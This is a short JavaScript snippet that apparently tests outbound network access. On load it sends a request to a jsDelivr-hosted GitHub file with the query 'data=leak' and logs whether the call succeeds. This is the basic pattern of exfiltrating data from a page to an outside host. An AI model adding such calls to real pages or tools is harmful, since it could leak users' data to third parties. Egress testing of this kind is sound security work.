(function() {
  console.log('attempting external xhr');
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://cdn.jsdelivr.net/gh/eltuza/misc@638511587e077b124b99a84baf8c34de6d8416d8/logtest.js/?data=leak');
  xhr.onload = function() {
      if (xhr.status === 200) {
        console.log('xhr completed');
      }
  };
  xhr.send();
})()
